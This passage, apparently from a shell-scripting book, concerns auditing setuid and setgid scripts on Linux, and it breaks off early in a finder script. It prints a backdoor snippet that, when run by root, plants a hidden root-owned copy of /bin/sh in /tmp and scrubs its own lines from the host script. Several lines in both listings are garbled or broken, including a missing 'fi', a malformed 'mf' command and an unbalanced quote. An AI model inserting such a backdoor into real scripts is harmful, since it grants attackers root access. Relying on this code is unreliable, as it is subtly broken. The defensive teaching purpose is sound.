  md: "# #45 Tracking User ID Applications\n\nThere are quite few ways that ruffians\
    \ and digital delinquents can break into a Linux system, whether they have an\
    \ account or not, and one of the easiest is finding an improperly protected setuid\
    \ or setgid command. as discussed in previous chapters, these commands change\
    \ the effective user for any subcommands they invoke, as specified in the configuration,\
    \ so a regular user might run a script where the commands in script are run as\
    \ the root or superuser. Bad. Dangerous!\n\nIn a setuid script, for example, adding\
    \ the following code can create a setuid root shell for the bad guy once it is\
    \ invoked by an unsuspecting admin logged in root.\n\n```\nif [ \"$USER\" = \"\
    root\" ]; then # REMOVE\ncp /bin/sh /tmp/.rootshell # REMOVE\nchown root /tmp/.rootshell\
    \ # REMOVE\nchmod -f 777 /tmp/.rootshell # REMOVE\ngrep -v \"# REMOVE\" > /tmp/junk\
    \ # REMOVE\nmf / /tmp/junk # REMOVE\n```\n\nOnce this script is inadvertently\
    \ run by root, a copy of /bin/sh is deceptiously copied into /tmp with the name\
    \ .rootshell and is made setuid root for the cracker to exploit at will. The script\
    \ causes itself to be rewritten to remove the conditional code (hence the # REMOVE\
    \ at the end of each line), leaving essentially nothing of what the cracker did.\n\
    \nThe code snippet should also be exploitable in any script or command that runs\
    \ with an effective user ID of root; however the critical need to ensure that\
    \ you know and approve of all setuid root commands on your system. Of course,\
    \ you should never have scripts with any sort of setuid or setgid permission for\
    \ this reason, but it's still smart to keep an eye on things.\n\nMore than showing\
    \ how to crack a system, however, is showing how to identify all the shell scripts\
    \ on your system that are marked setuid or setgid! Listing 6-1 details how to\
    \ accomplish this.\n\n# ## The Code\n\n```\n#!/bin/bash\n\nfinduid--Checks all\
    \ SUID files or programs to see if they're writable,\n# and outputs the matches\
    \ in a friendly and useful format\n\ntime=\"7\" # How far back (in days) to check\
    \ for modified cmds.\nverbose=0 # By default, let's be quiet about things.\n\n\
    if [ \"$1 = \"-v\" ]; then\n    verbose=1 # User specified findsuid -v, so let's\
    \ be verbose.\nfi\n```"
